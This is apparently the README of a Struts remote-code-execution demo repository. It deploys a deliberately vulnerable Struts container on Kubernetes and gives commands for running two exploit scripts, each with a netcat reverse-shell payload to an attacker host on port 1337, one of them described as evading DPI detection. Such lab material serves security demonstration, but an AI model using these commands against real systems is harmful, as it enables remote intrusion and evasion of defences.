# struts-demo
scripts for struts RCE demo and yaml file to deploy vulnerable container running struts super-app tomcat website.
Deploy the struts container via yaml file to kubernetes cluster
kubectl create namespace struts
kubectl create -f struts.yaml -n struts

A service is created for the website.  Use the IP address from the website with the python scripts to exploit a remote code execution vul in the struts container.
k get svc -n struts; k get pods -n struts

Use the struts1.py first (insert your own IP addresses for the website and the reverse shell using 1337 (LEET) port address.
python3 struts1.py http://xxx.xxx.xxx.xxx:8080/super-app/orders/3 'nc -nv 123.456.789.100 1337 -e /bin/sh'

Then use the struts-pwn2.py script to avoid DPI threat detection.
python struts-pwn2.py --exploit --url 'http://xxx.xxx.xxx.xxx:8080/super-app/orders/3' -c 'nc -nv 123.456.789.100 1337 -e /bin/sh'
